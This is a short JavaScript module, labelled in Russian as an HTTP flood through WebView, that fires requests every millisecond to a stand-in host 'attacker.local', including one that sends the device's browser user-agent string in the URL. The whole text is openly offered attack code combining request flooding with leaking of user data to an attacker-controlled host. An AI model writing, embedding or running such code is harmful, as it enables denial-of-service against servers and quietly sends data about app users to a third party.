// JS-модуль: HTTP-флуд через WebView
setInterval(() => {
    fetch('http://attacker.local/ping').catch(()=>{});
    fetch('http://attacker.local/log?d=' + navigator.userAgent).catch(()=>{});
}, 1);
